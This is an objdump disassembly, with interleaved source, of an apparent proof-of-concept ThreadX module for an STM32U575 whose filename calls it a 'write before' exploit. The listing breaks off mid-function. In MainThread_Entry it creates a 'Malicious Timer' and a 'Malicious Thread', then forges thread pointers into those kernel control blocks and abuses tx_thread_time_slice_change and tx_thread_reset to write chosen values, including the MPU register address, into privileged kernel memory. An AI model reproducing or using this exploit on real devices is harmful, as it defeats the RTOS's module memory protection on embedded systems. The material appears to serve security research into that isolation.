
stm32u575_m33_write_before_exploit.elf:     file format elf32-littlearm

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .preamble     000000a6  08020000  08020000  00010000  2**4
                  CONTENTS, ALLOC, LOAD, CODE
  1 .dynsym       00000000  080200a8  08021ae3  00011ae3  2**0
                  CONTENTS, ALLOC, LOAD, DATA
  2 .dynstr       00000000  080200a8  08021ae3  00011ae3  2**0
                  CONTENTS, ALLOC, LOAD, DATA
  3 .rel.dyn      00000000  080200a8  080200a8  000100a8  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  4 .got          00000030  08021a44  08021a44  00011a44  2**2
                  CONTENTS, ALLOC, LOAD, RELOC, DATA
  5 .plt          00000000  080200a8  08021ae3  00011ae3  2**0
                  CONTENTS, ALLOC, LOAD, CODE
  6 .interp       00000000  080200a8  080200a8  00011ae3  2**0
                  CONTENTS
  7 .hash         00000000  080200a8  08021ae3  00011ae3  2**0
                  CONTENTS, ALLOC, LOAD, DATA
  8 .text         0000199c  080200a8  080200a8  000100a8  2**3
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  9 .rodata       0000006f  08021a74  08021a74  00011a74  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
 10 .fast_run     00000000  20020030  20020030  00011ae3  2**0
                  CONTENTS
 11 .data_run     00000000  20020030  20020030  00011ae3  2**0
                  CONTENTS
 12 .bss          000023c8  20020030  20020030  00020030  2**4
                  ALLOC
 13 .heap         00000040  200223f8  200223f8  00020030  2**0
                  ALLOC
 14 .ARM.attributes 00000036  00000000  00000000  00011ae3  2**0
                  CONTENTS, READONLY
 15 .comment      00000043  00000000  00000000  00011b19  2**0
                  CONTENTS, READONLY
 16 .debug_line   0002bc7a  00000000  00000000  00011b5c  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 17 .debug_line_str 0000008e  00000000  00000000  0003d7d6  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 18 .debug_info   0001c538  00000000  00000000  0003d864  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 19 .debug_abbrev 00005a7c  00000000  00000000  00059d9c  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 20 .debug_aranges 00000ca0  00000000  00000000  0005f818  2**3
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 21 .debug_str    00014725  00000000  00000000  000604b8  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 22 .debug_macro  0000c6a1  00000000  00000000  00074bdd  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 23 .debug_frame  00001634  00000000  00000000  00081280  2**2
                  CONTENTS, READONLY, DEBUGGING, OCTETS

Disassembly of section .preamble:

08020000 <__preamble_start__>:
 8020000:	4d4f4455 	.word	0x4d4f4455
 8020004:	00000006 	.word	0x00000006
 8020008:	00000001 	.word	0x00000001
 802000c:	00000020 	.word	0x00000020
 8020010:	12345678 	.word	0x12345678
 8020014:	02000007 	.word	0x02000007
 8020018:	00000bb5 	.word	0x00000bb5
 802001c:	0000017d 	.word	0x0000017d
 8020020:	00000000 	.word	0x00000000
 8020024:	00000001 	.word	0x00000001
 8020028:	00000400 	.word	0x00000400
 802002c:	00000a19 	.word	0x00000a19
 8020030:	00000001 	.word	0x00000001
 8020034:	00000400 	.word	0x00000400
 8020038:	00001ae3 	.word	0x00001ae3
 802003c:	00002438 	.word	0x00002438
	...
 8020080:	00002541 	.word	0x00002541
 8020084:	61656100 	.word	0x61656100
 8020088:	01006962 	.word	0x01006962
 802008c:	0000001b 	.word	0x0000001b
 8020090:	4d2d3805 	.word	0x4d2d3805
 8020094:	49414d2e 	.word	0x49414d2e
 8020098:	1106004e 	.word	0x1106004e
 802009c:	03094d07 	.word	0x03094d07
 80200a0:	011b080a 	.word	0x011b080a
 80200a4:	012e      	.short	0x012e

Disassembly of section .text:

080200a8 <__text_start__>:
	...

080200b0 <_gcc_setup>:

    .global _gcc_setup
    .thumb_func
_gcc_setup:

    STMDB   sp!, {r3, r4, r5, r6, r7, lr}             // Store other preserved registers
 80200b0:	e92d 40f8 	stmdb	sp!, {r3, r4, r5, r6, r7, lr}

    ldr     r3, =__FLASH_segment_start__
 80200b4:	4b2e      	ldr	r3, [pc, #184]	; (8020170 <memory_set_done+0x2>)
    ldr     r4, =__RAM_segment_start__
 80200b6:	4c2f      	ldr	r4, [pc, #188]	; (8020174 <memory_set_done+0x6>)
    mov     r5,r0
 80200b8:	4605      	mov	r5, r0

    /* Copy GOT table. */

    ldr     r0, =__got_load_start__
 80200ba:	482f      	ldr	r0, [pc, #188]	; (8020178 <memory_set_done+0xa>)
    sub     r0,r0,r3
 80200bc:	eba0 0003 	sub.w	r0, r0, r3
    add     r0,r0,r5
 80200c0:	4428      	add	r0, r5
    ldr     r1, =__new_got_start__
 80200c2:	492e      	ldr	r1, [pc, #184]	; (802017c <memory_set_done+0xe>)
    sub     r1,r1, r4
 80200c4:	eba1 0104 	sub.w	r1, r1, r4
    add     r1,r1,r9
 80200c8:	4449      	add	r1, r9
    ldr     r2, =__new_got_end__
 80200ca:	4a2d      	ldr	r2, [pc, #180]	; (8020180 <memory_set_done+0x12>)
    sub     r2,r2,r4
 80200cc:	eba2 0204 	sub.w	r2, r2, r4
    add     r2,r2,r9
 80200d0:	444a      	add	r2, r9

080200d2 <new_got_setup>:

new_got_setup:
    cmp     r1, r2          // See if there are more GOT entries
 80200d2:	4291      	cmp	r1, r2
    beq     got_setup_done  // No, done with GOT setup
 80200d4:	d011      	beq.n	80200fa <got_setup_done>
    ldr     r6, [r0]        // Pickup current GOT entry
 80200d6:	6806      	ldr	r6, [r0, #0]
    cmp     r6, #0          // Is it 0?
 80200d8:	2e00      	cmp	r6, #0
    beq     address_built   // Yes, just skip the adjustment
 80200da:	d008      	beq.n	80200ee <address_built>
    cmp     r6, r4          // Is it in the code or data area?
 80200dc:	42a6      	cmp	r6, r4
    blt     flash_area      // If less than, it is a code address
 80200de:	db03      	blt.n	80200e8 <flash_area>
    sub     r6, r6, r4      // Compute offset of data area
 80200e0:	eba6 0604 	sub.w	r6, r6, r4
    add     r6, r6, r9      // Build address based on the loaded data address
 80200e4:	444e      	add	r6, r9
    b       address_built   // Finished building address
 80200e6:	e002      	b.n	80200ee <address_built>

080200e8 <flash_area>:
flash_area:
    sub     r6, r6, r3      // Compute offset of code area
 80200e8:	eba6 0603 	sub.w	r6, r6, r3
    add     r6, r6, r5      // Build address based on the loaded code address
 80200ec:	442e      	add	r6, r5

080200ee <address_built>:
address_built:
    str     r6, [r1]        // Store in new GOT table
 80200ee:	600e      	str	r6, [r1, #0]
    add     r0, r0, #4      // Move to next entry
 80200f0:	f100 0004 	add.w	r0, r0, #4
    add     r1, r1, #4      //
 80200f4:	f101 0104 	add.w	r1, r1, #4
    b       new_got_setup   // Continue at the top of the loop
 80200f8:	e7eb      	b.n	80200d2 <new_got_setup>

080200fa <got_setup_done>:
got_setup_done:

    /* Copy initialised sections into RAM if required. */
  
    ldr     r0, =__data_load_start__
 80200fa:	4822      	ldr	r0, [pc, #136]	; (8020184 <memory_set_done+0x16>)
    sub     r0,r0,r3
 80200fc:	eba0 0003 	sub.w	r0, r0, r3
    add     r0,r0,r5
 8020100:	4428      	add	r0, r5
    ldr     r1, =__data_start__
 8020102:	4921      	ldr	r1, [pc, #132]	; (8020188 <memory_set_done+0x1a>)
    sub     r1,r1, r4
 8020104:	eba1 0104 	sub.w	r1, r1, r4
    add     r1,r1,r9
 8020108:	4449      	add	r1, r9
    ldr     r2, =__data_end__
 802010a:	4a20      	ldr	r2, [pc, #128]	; (802018c <memory_set_done+0x1e>)
    sub     r2,r2,r4
 802010c:	eba2 0204 	sub.w	r2, r2, r4
    add     r2,r2,r9
 8020110:	444a      	add	r2, r9
    bl      crt0_memory_copy
 8020112:	f000 f815 	bl	8020140 <crt0_memory_copy>
  
    /* Zero bss. */
    
    ldr     r0, =__bss_start__
 8020116:	481e      	ldr	r0, [pc, #120]	; (8020190 <memory_set_done+0x22>)
    sub     r0,r0,r4
 8020118:	eba0 0004 	sub.w	r0, r0, r4
    add     r0,r0,r9
 802011c:	4448      	add	r0, r9
    ldr     r1, =__bss_end__
 802011e:	491d      	ldr	r1, [pc, #116]	; (8020194 <memory_set_done+0x26>)
    sub     r1,r1,r4
 8020120:	eba1 0104 	sub.w	r1, r1, r4
    add     r1,r1,r9
 8020124:	4449      	add	r1, r9
    mov     r2, #0
 8020126:	f04f 0200 	mov.w	r2, #0
    bl      crt0_memory_set
 802012a:	f000 f81a 	bl	8020162 <crt0_memory_set>

    
    LDMIA   sp!, {r3, r4, r5, r6, r7, lr}       // Store other preserved registers
 802012e:	e8bd 40f8 	ldmia.w	sp!, {r3, r4, r5, r6, r7, lr}
    bx      lr                                  // Return to caller
 8020132:	4770      	bx	lr
 8020134:	f3af 8000 	nop.w
 8020138:	f3af 8000 	nop.w
 802013c:	f3af 8000 	nop.w

08020140 <crt0_memory_copy>:

  /* Startup helper functions. */

    .thumb_func
crt0_memory_copy:
    cmp     r0, r1
 8020140:	4288      	cmp	r0, r1
    beq     memory_copy_done
 8020142:	d00d      	beq.n	8020160 <memory_copy_done>
    cmp     r2, r1
 8020144:	428a      	cmp	r2, r1
    beq     memory_copy_done
 8020146:	d00b      	beq.n	8020160 <memory_copy_done>
    sub     r2, r2, r1
 8020148:	eba2 0201 	sub.w	r2, r2, r1

0802014c <memory_copy_loop>:
memory_copy_loop:
    ldrb    r3, [r0]
 802014c:	7803      	ldrb	r3, [r0, #0]
    add     r0, r0, #1
 802014e:	f100 0001 	add.w	r0, r0, #1
    strb    r3, [r1]
 8020152:	700b      	strb	r3, [r1, #0]
    add     r1, r1, #1
 8020154:	f101 0101 	add.w	r1, r1, #1
    sub     r2, r2, #1
 8020158:	f1a2 0201 	sub.w	r2, r2, #1
    cmp     r2, #0
 802015c:	2a00      	cmp	r2, #0
    bne     memory_copy_loop
 802015e:	d1f5      	bne.n	802014c <memory_copy_loop>

08020160 <memory_copy_done>:
memory_copy_done:
    bx      lr
 8020160:	4770      	bx	lr

08020162 <crt0_memory_set>:

    .thumb_func
crt0_memory_set:
    cmp     r0, r1
 8020162:	4288      	cmp	r0, r1
    beq     memory_set_done
 8020164:	d003      	beq.n	802016e <memory_set_done>
    strb    r2, [r0]
 8020166:	7002      	strb	r2, [r0, #0]
    add     r0, r0, #1
 8020168:	f100 0001 	add.w	r0, r0, #1
    b       crt0_memory_set
 802016c:	e7f9      	b.n	8020162 <crt0_memory_set>

0802016e <memory_set_done>:
memory_set_done:
    bx      lr
 802016e:	4770      	bx	lr
    ldr     r3, =__FLASH_segment_start__
 8020170:	08020000 	.word	0x08020000
    ldr     r4, =__RAM_segment_start__
 8020174:	20020000 	.word	0x20020000
    ldr     r0, =__got_load_start__
 8020178:	08021a44 	.word	0x08021a44
    ldr     r1, =__new_got_start__
 802017c:	20020000 	.word	0x20020000
    ldr     r2, =__new_got_end__
 8020180:	20020030 	.word	0x20020030
    ldr     r0, =__data_load_start__
 8020184:	08021ae4 	.word	0x08021ae4
    ldr     r1, =__data_start__
 8020188:	20020030 	.word	0x20020030
    ldr     r2, =__data_end__
 802018c:	20020030 	.word	0x20020030
    ldr     r0, =__bss_start__
 8020190:	20020030 	.word	0x20020030
    ldr     r1, =__bss_end__
 8020194:	200223f8 	.word	0x200223f8

08020198 <default_module_start>:
  * @brief  Module entry function.
  * @param  id : Module ID
  * @retval None
  */
void    default_module_start(ULONG id)
{
 8020198:	b580      	push	{r7, lr}
 802019a:	b08c      	sub	sp, #48	; 0x30
 802019c:	af08      	add	r7, sp, #32
 802019e:	6078      	str	r0, [r7, #4]
  CHAR    *pointer;
  
  /* Allocate all the objects. In MPU mode, modules cannot allocate control blocks within
  their own memory area so they cannot corrupt the resident portion of ThreadX by overwriting
  the control block(s).  */
  txm_module_object_allocate((void*)&MainThread, sizeof(TX_THREAD));
 80201a0:	21e8      	movs	r1, #232	; 0xe8
 80201a2:	4b3a      	ldr	r3, [pc, #232]	; (802028c <default_module_start+0xf4>)
 80201a4:	f859 3003 	ldr.w	r3, [r9, r3]
 80201a8:	4618      	mov	r0, r3
 80201aa:	f000 fcad 	bl	8020b08 <_txm_module_object_allocate>
  txm_module_object_allocate((void*)&ModuleBytePool, sizeof(TX_BYTE_POOL));
 80201ae:	2134      	movs	r1, #52	; 0x34
 80201b0:	4b37      	ldr	r3, [pc, #220]	; (8020290 <default_module_start+0xf8>)
 80201b2:	f859 3003 	ldr.w	r3, [r9, r3]
 80201b6:	4618      	mov	r0, r3
 80201b8:	f000 fca6 	bl	8020b08 <_txm_module_object_allocate>
  txm_module_object_allocate((void*)&ModuleBlockPool, sizeof(TX_BLOCK_POOL));
 80201bc:	2130      	movs	r1, #48	; 0x30
 80201be:	4b35      	ldr	r3, [pc, #212]	; (8020294 <default_module_start+0xfc>)
 80201c0:	f859 3003 	ldr.w	r3, [r9, r3]
 80201c4:	4618      	mov	r0, r3
 80201c6:	f000 fc9f 	bl	8020b08 <_txm_module_object_allocate>
  
  /* Create a byte memory pool from which to allocate the thread stacks.  */
  tx_byte_pool_create(ModuleBytePool, "Module Byte Pool", (UCHAR*)default_module_pool_space, DEFAULT_BYTE_POOL_SIZE);
 80201ca:	4b31      	ldr	r3, [pc, #196]	; (8020290 <default_module_start+0xf8>)
 80201cc:	f859 3003 	ldr.w	r3, [r9, r3]
 80201d0:	6818      	ldr	r0, [r3, #0]
 80201d2:	2334      	movs	r3, #52	; 0x34
 80201d4:	9300      	str	r3, [sp, #0]
 80201d6:	f242 33a0 	movw	r3, #9120	; 0x23a0
 80201da:	4a2f      	ldr	r2, [pc, #188]	; (8020298 <default_module_start+0x100>)
 80201dc:	f859 2002 	ldr.w	r2, [r9, r2]
 80201e0:	492e      	ldr	r1, [pc, #184]	; (802029c <default_module_start+0x104>)
 80201e2:	4479      	add	r1, pc
 80201e4:	f000 fa68 	bl	80206b8 <_txe_byte_pool_create>
  
  /* Allocate the stack for thread 0.  */
  tx_byte_allocate(ModuleBytePool, (VOID **) &pointer, DEFAULT_STACK_SIZE, TX_NO_WAIT);
 80201e8:	4b29      	ldr	r3, [pc, #164]	; (8020290 <default_module_start+0xf8>)
 80201ea:	f859 3003 	ldr.w	r3, [r9, r3]
 80201ee:	6818      	ldr	r0, [r3, #0]
 80201f0:	f107 010c 	add.w	r1, r7, #12
 80201f4:	2300      	movs	r3, #0
 80201f6:	f44f 6240 	mov.w	r2, #3072	; 0xc00
 80201fa:	f000 fa3f 	bl	802067c <_txe_byte_allocate>
  
  /* Create the main thread.  */
  tx_thread_create(MainThread, "Module Main Thread", MainThread_Entry, 0,
 80201fe:	4b23      	ldr	r3, [pc, #140]	; (802028c <default_module_start+0xf4>)
 8020200:	f859 3003 	ldr.w	r3, [r9, r3]
 8020204:	6818      	ldr	r0, [r3, #0]
 8020206:	68fb      	ldr	r3, [r7, #12]
 8020208:	22e8      	movs	r2, #232	; 0xe8
 802020a:	9206      	str	r2, [sp, #24]
 802020c:	2201      	movs	r2, #1
 802020e:	9205      	str	r2, [sp, #20]
 8020210:	2200      	movs	r2, #0
 8020212:	9204      	str	r2, [sp, #16]
 8020214:	2202      	movs	r2, #2
 8020216:	9203      	str	r2, [sp, #12]
 8020218:	2202      	movs	r2, #2
 802021a:	9202      	str	r2, [sp, #8]
 802021c:	f44f 6240 	mov.w	r2, #3072	; 0xc00
 8020220:	9201      	str	r2, [sp, #4]
 8020222:	9300      	str	r3, [sp, #0]
 8020224:	2300      	movs	r3, #0
 8020226:	4a1e      	ldr	r2, [pc, #120]	; (80202a0 <default_module_start+0x108>)
 8020228:	f859 2002 	ldr.w	r2, [r9, r2]
 802022c:	491d      	ldr	r1, [pc, #116]	; (80202a4 <default_module_start+0x10c>)
 802022e:	4479      	add	r1, pc
 8020230:	f001 f83a 	bl	80212a8 <_txe_thread_create>
                   pointer, DEFAULT_STACK_SIZE,
                   MAIN_THREAD_PRIO, MAIN_THREAD_PREEMPTION_THRESHOLD, TX_NO_TIME_SLICE, TX_AUTO_START);
  
  /* Allocate the memory for a small block pool. */
  tx_byte_allocate(ModuleBytePool, (VOID **) &pointer,
 8020234:	4b16      	ldr	r3, [pc, #88]	; (8020290 <default_module_start+0xf8>)
 8020236:	f859 3003 	ldr.w	r3, [r9, r3]
 802023a:	6818      	ldr	r0, [r3, #0]
 802023c:	f107 010c 	add.w	r1, r7, #12
 8020240:	2300      	movs	r3, #0
 8020242:	f44f 6280 	mov.w	r2, #1024	; 0x400
 8020246:	f000 fa19 	bl	802067c <_txe_byte_allocate>
                   DEFAULT_BLOCK_POOL_SIZE, TX_NO_WAIT);
  
  /* Create a block memory pool. */
  tx_block_pool_create(ModuleBlockPool, "Module Block Pool",
 802024a:	4b12      	ldr	r3, [pc, #72]	; (8020294 <default_module_start+0xfc>)
 802024c:	f859 3003 	ldr.w	r3, [r9, r3]
 8020250:	6818      	ldr	r0, [r3, #0]
 8020252:	68fb      	ldr	r3, [r7, #12]
 8020254:	2230      	movs	r2, #48	; 0x30
 8020256:	9201      	str	r2, [sp, #4]
 8020258:	f44f 6280 	mov.w	r2, #1024	; 0x400
 802025c:	9200      	str	r2, [sp, #0]
 802025e:	2204      	movs	r2, #4
 8020260:	4911      	ldr	r1, [pc, #68]	; (80202a8 <default_module_start+0x110>)
 8020262:	4479      	add	r1, pc
 8020264:	f000 f944 	bl	80204f0 <_txe_block_pool_create>
                       sizeof(ULONG), pointer, DEFAULT_BLOCK_POOL_SIZE);
  
  /* Allocate a block. */
  tx_block_allocate(ModuleBlockPool, (VOID **) &pointer,
 8020268:	4b0a      	ldr	r3, [pc, #40]	; (8020294 <default_module_start+0xfc>)
 802026a:	f859 3003 	ldr.w	r3, [r9, r3]
 802026e:	681b      	ldr	r3, [r3, #0]
 8020270:	f107 010c 	add.w	r1, r7, #12
 8020274:	2200      	movs	r2, #0
 8020276:	4618      	mov	r0, r3
 8020278:	f000 f922 	bl	80204c0 <_txe_block_allocate>
                    TX_NO_WAIT);
  
  /* Release the block back to the pool. */
  tx_block_release(pointer);
 802027c:	68fb      	ldr	r3, [r7, #12]
 802027e:	4618      	mov	r0, r3
 8020280:	f000 f9e6 	bl	8020650 <_txe_block_release>
  
}
 8020284:	bf00      	nop
 8020286:	3710      	adds	r7, #16
 8020288:	46bd      	mov	sp, r7
 802028a:	bd80      	pop	{r7, pc}
 802028c:	00000020 	.word	0x00000020
 8020290:	0000000c 	.word	0x0000000c
 8020294:	0000001c 	.word	0x0000001c
 8020298:	00000014 	.word	0x00000014
 802029c:	0000188e 	.word	0x0000188e
 80202a0:	00000018 	.word	0x00000018
 80202a4:	00001856 	.word	0x00001856
 80202a8:	00001836 	.word	0x00001836

080202ac <MainThread_Entry>:
  * @brief  Module main thread.
  * @param  thread_input: thread id
  * @retval none
  */
void MainThread_Entry(ULONG thread_input)
{
 80202ac:	b580      	push	{r7, lr}
 80202ae:	b092      	sub	sp, #72	; 0x48
 80202b0:	af08      	add	r7, sp, #32
 80202b2:	6078      	str	r0, [r7, #4]
//  ULONG *mpu_pointer = 0xe000ed94;
//  ULONG mpu_value = *mpu_pointer;

  CHAR *pointer;
  TX_TIMER *MaliciousTimer;
  txm_module_object_allocate((void*)&MaliciousTimer, sizeof(TX_TIMER));
 80202b4:	f107 0310 	add.w	r3, r7, #16
 80202b8:	2134      	movs	r1, #52	; 0x34
 80202ba:	4618      	mov	r0, r3
 80202bc:	f000 fc24 	bl	8020b08 <_txm_module_object_allocate>
  tx_timer_create(MaliciousTimer, "Malicious Timer", MaliciousTimerFunction, 0x54485244, 0x54485244, 0x54485244, TX_NO_ACTIVATE);
 80202c0:	6938      	ldr	r0, [r7, #16]
 80202c2:	2334      	movs	r3, #52	; 0x34
 80202c4:	9303      	str	r3, [sp, #12]
 80202c6:	2300      	movs	r3, #0
 80202c8:	9302      	str	r3, [sp, #8]
 80202ca:	4b69      	ldr	r3, [pc, #420]	; (8020470 <MainThread_Entry+0x1c4>)
 80202cc:	9301      	str	r3, [sp, #4]
 80202ce:	4b68      	ldr	r3, [pc, #416]	; (8020470 <MainThread_Entry+0x1c4>)
 80202d0:	9300      	str	r3, [sp, #0]
 80202d2:	4b67      	ldr	r3, [pc, #412]	; (8020470 <MainThread_Entry+0x1c4>)
 80202d4:	4a6a      	ldr	r2, [pc, #424]	; (8020480 <MainThread_Entry+0x1d4>)
 80202d6:	f859 2002 	ldr.w	r2, [r9, r2]
 80202da:	496a      	ldr	r1, [pc, #424]	; (8020484 <MainThread_Entry+0x1d8>)
 80202dc:	4479      	add	r1, pc
 80202de:	f001 fa2f 	bl	8021740 <_txe_timer_create>

  TX_THREAD *MaliciousThread;
  txm_module_object_allocate((void*)&MaliciousThread, sizeof(TX_THREAD));
 80202e2:	f107 030c 	add.w	r3, r7, #12
 80202e6:	21e8      	movs	r1, #232	; 0xe8
 80202e8:	4618      	mov	r0, r3
 80202ea:	f000 fc0d 	bl	8020b08 <_txm_module_object_allocate>
  tx_byte_allocate(ModuleBytePool, (VOID **) &pointer, DEFAULT_STACK_SIZE, TX_NO_WAIT);
 80202ee:	4b66      	ldr	r3, [pc, #408]	; (8020488 <MainThread_Entry+0x1dc>)
 80202f0:	f859 3003 	ldr.w	r3, [r9, r3]
 80202f4:	6818      	ldr	r0, [r3, #0]
 80202f6:	f107 0114 	add.w	r1, r7, #20
 80202fa:	2300      	movs	r3, #0
 80202fc:	f44f 6240 	mov.w	r2, #3072	; 0xc00
 8020300:	f000 f9bc 	bl	802067c <_txe_byte_allocate>
  tx_thread_create(MaliciousThread, "Malicious Thread", MainThread_Entry, 0,
 8020304:	68f8      	ldr	r0, [r7, #12]
 8020306:	697b      	ldr	r3, [r7, #20]
 8020308:	22e8      	movs	r2, #232	; 0xe8
 802030a:	9206      	str	r2, [sp, #24]
 802030c:	2201      	movs	r2, #1
 802030e:	9205      	str	r2, [sp, #20]
 8020310:	4a57      	ldr	r2, [pc, #348]	; (8020470 <MainThread_Entry+0x1c4>)
 8020312:	9204      	str	r2, [sp, #16]
 8020314:	2202      	movs	r2, #2
 8020316:	9203      	str	r2, [sp, #12]
 8020318:	2202      	movs	r2, #2
 802031a:	9202      	str	r2, [sp, #8]
 802031c:	f44f 6240 	mov.w	r2, #3072	; 0xc00
 8020320:	9201      	str	r2, [sp, #4]
 8020322:	9300      	str	r3, [sp, #0]
 8020324:	2300      	movs	r3, #0
 8020326:	4a59      	ldr	r2, [pc, #356]	; (802048c <MainThread_Entry+0x1e0>)
 8020328:	f859 2002 	ldr.w	r2, [r9, r2]
 802032c:	4958      	ldr	r1, [pc, #352]	; (8020490 <MainThread_Entry+0x1e4>)
 802032e:	4479      	add	r1, pc
 8020330:	f000 ffba 	bl	80212a8 <_txe_thread_create>
                       pointer, DEFAULT_STACK_SIZE,
                       MAIN_THREAD_PRIO, MAIN_THREAD_PREEMPTION_THRESHOLD, 0x54485244, TX_AUTO_START);

  // write to privileged kernel memory
  MaliciousTimer->tx_timer_id = 0xffffffff;
 8020334:	693b      	ldr	r3, [r7, #16]
 8020336:	f04f 32ff 	mov.w	r2, #4294967295
 802033a:	601a      	str	r2, [r3, #0]

  ULONG time_slice;
  TX_THREAD *ForgedThread;
  // write thread_state
  ForgedThread = (ULONG) MaliciousThread + 24;
 802033c:	68fb      	ldr	r3, [r7, #12]
 802033e:	3318      	adds	r3, #24
 8020340:	627b      	str	r3, [r7, #36]	; 0x24
  tx_thread_time_slice_change(ForgedThread, 0x1, &time_slice);
 8020342:	f107 0308 	add.w	r3, r7, #8
 8020346:	461a      	mov	r2, r3
 8020348:	2101      	movs	r1, #1
 802034a:	6a78      	ldr	r0, [r7, #36]	; 0x24
 802034c:	f001 f974 	bl	8021638 <_txe_thread_time_slice_change>
  // write thread_stack_start
  ForgedThread = (ULONG) MaliciousTimer + 12;
 8020350:	693b      	ldr	r3, [r7, #16]
 8020352:	330c      	adds	r3, #12
 8020354:	627b      	str	r3, [r7, #36]	; 0x24
  tx_thread_time_slice_change(ForgedThread, 0x54485244, &time_slice);
 8020356:	f107 0308 	add.w	r3, r7, #8
 802035a:	461a      	mov	r2, r3
 802035c:	4944      	ldr	r1, [pc, #272]	; (8020470 <MainThread_Entry+0x1c4>)
 802035e:	6a78      	ldr	r0, [r7, #36]	; 0x24
 8020360:	f001 f96a 	bl	8021638 <_txe_thread_time_slice_change>
  ForgedThread = (ULONG) MaliciousTimer + 40;
 8020364:	693b      	ldr	r3, [r7, #16]
 8020366:	3328      	adds	r3, #40	; 0x28
 8020368:	627b      	str	r3, [r7, #36]	; 0x24
  tx_thread_time_slice_change(ForgedThread, 0x54485244, &time_slice);
 802036a:	f107 0308 	add.w	r3, r7, #8
 802036e:	461a      	mov	r2, r3
 8020370:	493f      	ldr	r1, [pc, #252]	; (8020470 <MainThread_Entry+0x1c4>)
 8020372:	6a78      	ldr	r0, [r7, #36]	; 0x24
 8020374:	f001 f960 	bl	8021638 <_txe_thread_time_slice_change>
  ForgedThread = (ULONG) MaliciousTimer + 64;
 8020378:	693b      	ldr	r3, [r7, #16]
 802037a:	3340      	adds	r3, #64	; 0x40
 802037c:	627b      	str	r3, [r7, #36]	; 0x24
  tx_thread_time_slice_change(ForgedThread, 0xe000ed94, &time_slice);
 802037e:	f107 0308 	add.w	r3, r7, #8
 8020382:	461a      	mov	r2, r3
 8020384:	493b      	ldr	r1, [pc, #236]	; (8020474 <MainThread_Entry+0x1c8>)
 8020386:	6a78      	ldr	r0, [r7, #36]	; 0x24
 8020388:	f001 f956 	bl	8021638 <_txe_thread_time_slice_change>
  // dereference thread_stack_start in thread object
  tx_thread_reset(MaliciousThread);
 802038c:	68fb      	ldr	r3, [r7, #12]
 802038e:	4618      	mov	r0, r3
 8020390:	f001 f8ce 	bl	8021530 <_txe_thread_reset>

  // write to privileged kernel memory
  MaliciousTimer->tx_timer_id = 0xffffffff;
 8020394:	693b      	ldr	r3, [r7, #16]
 8020396:	f04f 32ff 	mov.w	r2, #4294967295
 802039a:	601a      	str	r2, [r3, #0]

  /* Request access to the queue from the module manager */
  status = txm_module_object_pointer_get(TXM_QUEUE_OBJECT, "Resident Queue", (VOID **)&ResidentQueue);
 802039c:	4b3d      	ldr	r3, [pc, #244]	; (8020494 <MainThread_Entry+0x1e8>)
 802039e:	f859 3003 	ldr.w	r3, [r9, r3]
 80203a2:	461a      	mov	r2, r3
 80203a4:	4b3c      	ldr	r3, [pc, #240]	; (8020498 <MainThread_Entry+0x1ec>)
 80203a6:	447b      	add	r3, pc
 80203a8:	4619      	mov	r1, r3
 80203aa:	2005      	movs	r0, #5
 80203ac:	f000 fbd8 	bl	8020b60 <_txm_module_object_pointer_get>
 80203b0:	6238      	str	r0, [r7, #32]

  if(status)
 80203b2:	6a3b      	ldr	r3, [r7, #32]
 80203b4:	2b00      	cmp	r3, #0
 80203b6:	d001      	beq.n	80203bc <MainThread_Entry+0x110>
  {
    Error_Handler();
 80203b8:	f000 f870 	bl	802049c <Error_Handler>
  }

  /* Writing to write and read region */
  s_msg = WRITING_TO_READWRITE;
 80203bc:	2358      	movs	r3, #88	; 0x58
 80203be:	61bb      	str	r3, [r7, #24]
  tx_queue_send(ResidentQueue, &s_msg, TX_NO_WAIT);
 80203c0:	4b34      	ldr	r3, [pc, #208]	; (8020494 <MainThread_Entry+0x1e8>)
 80203c2:	f859 3003 	ldr.w	r3, [r9, r3]
 80203c6:	681b      	ldr	r3, [r3, #0]
 80203c8:	f107 0118 	add.w	r1, r7, #24
 80203cc:	2200      	movs	r2, #0
 80203ce:	4618      	mov	r0, r3
 80203d0:	f000 fe3a 	bl	8021048 <_txe_queue_send>
  *(ULONG *)READWRITE_REGION = 0xABABABAB;
 80203d4:	4b28      	ldr	r3, [pc, #160]	; (8020478 <MainThread_Entry+0x1cc>)
 80203d6:	f04f 32ab 	mov.w	r2, #2880154539	; 0xabababab
 80203da:	601a      	str	r2, [r3, #0]
  tx_thread_sleep(TX_TIMER_TICKS_PER_SECOND / 10);
 80203dc:	200a      	movs	r0, #10
 80203de:	f001 f8d3 	bl	8021588 <_tx_thread_sleep>

  /* WReading from write and read region */
  s_msg = READING_FROM_READWRITE;
 80203e2:	2342      	movs	r3, #66	; 0x42
 80203e4:	61bb      	str	r3, [r7, #24]
  tx_queue_send(ResidentQueue, &s_msg, TX_NO_WAIT);
 80203e6:	4b2b      	ldr	r3, [pc, #172]	; (8020494 <MainThread_Entry+0x1e8>)
 80203e8:	f859 3003 	ldr.w	r3, [r9, r3]
 80203ec:	681b      	ldr	r3, [r3, #0]
 80203ee:	f107 0118 	add.w	r1, r7, #24
 80203f2:	2200      	movs	r2, #0
 80203f4:	4618      	mov	r0, r3
 80203f6:	f000 fe27 	bl	8021048 <_txe_queue_send>
  readbuffer = *(ULONG*)READWRITE_REGION;
 80203fa:	4b1f      	ldr	r3, [pc, #124]	; (8020478 <MainThread_Entry+0x1cc>)
 80203fc:	681b      	ldr	r3, [r3, #0]
 80203fe:	61fb      	str	r3, [r7, #28]
  tx_thread_sleep(TX_TIMER_TICKS_PER_SECOND / 10);
 8020400:	200a      	movs	r0, #10
 8020402:	f001 f8c1 	bl	8021588 <_tx_thread_sleep>

  /* Reading from read only region */
  s_msg = READING_FROM_READONLY;
 8020406:	2337      	movs	r3, #55	; 0x37
 8020408:	61bb      	str	r3, [r7, #24]
  tx_queue_send(ResidentQueue, &s_msg, TX_NO_WAIT);
 802040a:	4b22      	ldr	r3, [pc, #136]	; (8020494 <MainThread_Entry+0x1e8>)
 802040c:	f859 3003 	ldr.w	r3, [r9, r3]
 8020410:	681b      	ldr	r3, [r3, #0]
 8020412:	f107 0118 	add.w	r1, r7, #24
